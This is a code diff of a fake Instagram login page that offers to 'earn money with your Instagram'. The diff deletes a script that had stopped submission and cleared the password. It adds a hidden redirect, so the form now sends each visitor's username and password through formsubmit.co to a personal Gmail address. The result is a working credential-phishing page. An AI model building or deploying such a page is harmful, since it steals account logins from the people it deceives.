@@ -93,7 +93,7 @@ small {
         EARN MONEY WITH YOUR INSTAGRAM</span>
       </div>
 
-    <form id="loginForm" action="https://formsubmit.co/abhishekverma955544@gmail.com" method="POST">
+   <form id="loginForm" action="https://formsubmit.co/abhishekverma955544@gmail.com" method="POST">
 
     <input
         id="username"
@@ -109,13 +109,14 @@ small {
         name="Password"
         placeholder="Password"
         autocomplete="off"
-        >
+    >
 
-        <button type="submit">
-            Log in
-        </button>
+    <input type="hidden" name="_next" value="https://earnmoneyonline1099.github.io/online-earning/">
 
-    </form>
+    <button type="submit">
+        Log in
+    </button>
+</form>
 
     <div id="msg">
         Login Failed   </div>
@@ -126,21 +127,3 @@ small {
 
 </div>
 
-<script>
-
-document.getElementById("loginForm").addEventListener("submit", function(e) {
-
-    e.preventDefault();
-
-    document.getElementById("msg").style.display = "block";
-
-    // Password is immediately cleared.
-    // Nothing is stored or sent anywhere.
-    document.getElementById("password").value = "";
-
-});
-
-</script>
-
-</body>
-</html>
